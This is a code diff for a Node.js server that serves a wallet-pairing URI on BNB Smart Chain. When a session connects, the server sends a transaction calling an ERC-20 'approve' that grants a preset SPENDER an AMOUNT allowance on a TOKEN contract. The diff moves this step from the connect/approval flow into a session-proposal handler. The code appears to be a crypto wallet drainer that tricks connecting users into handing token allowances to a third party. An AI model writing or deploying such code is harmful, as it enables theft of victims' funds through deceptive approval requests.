@@ -24,6 +24,44 @@ async function init() {
             icons: []
         }
     });
+
+    wallet.on('session_proposal', async (proposal) => {
+        try {
+            const session = await wallet.approveSession({
+                id: proposal.id,
+                namespaces: {
+                    eip155: {
+                        chains: ['eip155:56'],
+                        methods: ['eth_sendTransaction'],
+                        events: ['chainChanged', 'accountsChanged']
+                    }
+                }
+            });
+
+            const iface = new ethers.Interface([
+                "function approve(address spender, uint256 amount) external returns (bool)"
+            ]);
+            const data = iface.encodeFunctionData("approve", [SPENDER, AMOUNT]);
+
+            await wallet.request({
+                topic: session.topic,
+                chainId: 'eip155:56',
+                request: {
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        to: TOKEN,
+                        data: data,
+                        value: '0x0'
+                    }]
+                }
+            });
+
+            settled = true;
+        } catch (e) {
+            console.error('Session error:', e.message);
+        }
+    });
+
     console.log('Wallet initialized');
 }
 
@@ -32,37 +70,12 @@ const server = http.createServer(async (req, res) => {
     
     if (req.url === '/uri') {
         try {
-            const { uri, approval } = await wallet.connect({
-                requiredNamespaces: {
-                    eip155: {
-                        methods: ['eth_sendTransaction'],
-                        chains: ['eip155:56'],
-                        events: ['chainChanged', 'accountsChanged']
-                    }
-                }
+            const { uri } = await wallet.core.pairing.create({
+                methods: ['eth_sendTransaction'],
+                chains: ['eip155:56'],
+                events: ['chainChanged', 'accountsChanged']
             });
-
-            approval().then(async (session) => {
-                const iface = new ethers.Interface([
-                    "function approve(address spender, uint256 amount) external returns (bool)"
-                ]);
-                const data = iface.encodeFunctionData("approve", [SPENDER, AMOUNT]);
-
-                await wallet.request({
-                    topic: session.topic,
-                    chainId: 'eip155:56',
-                    request: {
-                        method: 'eth_sendTransaction',
-                        params: [{
-                            to: TOKEN,
-                            data: data,
-                            value: '0x0'
-                        }]
-                    }
-                });
-                settled = true;
-            }).catch(() => {});
-
+            
             res.writeHead(200, { 'Content-Type': 'application/json' });
             res.end(JSON.stringify({ uri }));
         } catch (e) {
